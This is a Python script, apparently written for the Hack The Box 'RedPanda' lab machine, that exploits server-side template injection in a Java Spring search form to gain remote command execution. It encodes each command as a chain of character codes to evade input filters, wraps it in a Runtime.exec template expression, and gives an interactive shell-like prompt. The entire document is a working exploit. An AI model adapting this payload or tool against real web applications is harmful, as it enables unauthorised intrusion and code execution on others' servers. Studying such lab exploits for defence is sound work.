# A simple script to handle the rce found in `RedPanda` on HTB.
import requests
from termcolor import colored
from bs4 import BeautifulSoup

class SSTI_RCE:

    def __init__(self) -> None:
        self.target = "http://10.10.11.170:8080/search"

    def generate_command_ASCII(self, command: str) -> list[int]:
        encoded_command = [ord(c) for c in command]
        return encoded_command

    def generate_payload(self, encoding_command: list[int]) -> str:
        final_payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % encoding_command[0]
        for c in encoding_command[1::]:
            final_payload += ".concat(T(java.lang.Character).toString(%s))" %c
        final_payload += ").getInputStream())}"
        return final_payload

    def post_command(self, payload: str) -> str:
        payload_data = {"name": payload}
        post_request = requests.post(self.target, data = payload_data)
        parser = BeautifulSoup(post_request.content, 'html.parser')
        all_h2 = parser.find_all("h2")[0].get_text()
        result = all_h2.replace('You searched for:','').strip()
        print(colored("=" * 50, "yellow"), colored(f"\n{result}\n", "green"), colored("=" * 50, "yellow"))

    def cmd(self):
        CMD_FLAG = True;
        while CMD_FLAG:
            command = input(colored(">> ", "red"))
            if command == "":
                pass
            elif command == "!EXIT":
                break
            else:
                ascii_value = self.generate_command_ASCII(command)
                payload = self.generate_payload(ascii_value)
                self.post_command(payload)


if __name__ == '__main__':
    myObj = SSTI_RCE()
    myObj.cmd()